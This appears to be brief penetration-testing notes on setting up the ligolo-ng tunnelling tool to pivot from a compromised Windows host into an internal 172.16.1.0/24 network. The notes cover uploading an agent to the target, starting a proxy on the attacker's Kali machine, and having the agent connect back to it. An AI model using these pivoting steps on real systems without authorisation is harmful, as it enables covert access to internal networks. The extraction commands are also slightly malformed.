# ligolo-ng setup

## Preparation

### Download and Extract Ligolo-NG

```bash
unzip ligolo-ng_agent_0.7.2_windows_amd64.zip >> agent.exe
tar xvzf ligolo-ng_proxy_0.7.2_linux_arm64.tar.gz >> proxy
```

## Steps to Configure and Use Ligolo-NG

### 1. Upload the `agent.exe` to the Target System

Transfer the `agent.exe` file to the target machine.

### 2. Add Interface to Kali

```bash
sudo ip tuntap add user kali mode tun ligolo
```

### 3. Activate the Ligolo Network Adapter

```bash
sudo ip link set ligolo up
```

### 4. Run the Proxy Server on the Attacker Machine

```bash
./proxy -selfcert
```

### 5. Activate the Agent on the Target

On the target system, run:

```bash
.\agent.exe -connect 192.168.1.1:11601 -ignore-cert
```

### 6. Select Target Session

In the proxy console, use the `session` command to select the desired target session:

```bash
session
```

### 7. Add a New Route to the Proxy Server

```bash
sudo ip route add 172.16.1.0/24 dev ligolo
```

### 8. Verify Routes

Check the routes using the following command:

```bash
ip route
```

### 9. Start the Proxy Tunnel

```bash
start
```

### 10. Verify Connectivity

Ping the target network to confirm connectivity:

```bash
ping 172.16.1.1
